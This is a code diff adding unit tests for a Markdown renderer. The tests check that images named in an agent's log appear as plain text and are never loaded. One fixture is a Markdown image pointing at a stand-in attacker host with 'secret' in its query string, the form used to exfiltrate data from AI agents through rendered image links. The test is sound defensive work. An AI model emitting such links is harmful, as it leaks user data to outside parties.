@@ -26,3 +26,26 @@ describe("Markdown (task descriptions, comments, packet summaries)", () => {
     expect(html).toContain('href="example.com/a.html"')
   })
 })
+
+describe("Markdown with images as text (an agent's log, CEL-107)", () => {
+  const renderWith = (source: string, images?: "show" | "text") =>
+    renderToStaticMarkup(
+      createElement(
+        RegistryProvider,
+        { initialValues: [[boardAtom, AsyncResult.success(board)]] },
+        createElement(Markdown, { source, ...(images ? { images } : {}) }),
+      ),
+    )
+
+  it("never loads an image a message names: its alt text and address show as plain text", () => {
+    const html = renderWith("Look: ![x](https://evil.example/p.png?d=secret)", "text")
+    expect(html).not.toContain("<img")
+    expect(html).not.toContain("src=")
+    expect(html).toContain("https://evil.example/p.png?d=secret")
+    expect(html).toContain("Image: x")
+  })
+
+  it("comments still show their images", () => {
+    expect(renderWith("![shot](https://example.com/a.png)")).toContain("<img")
+  })
+})
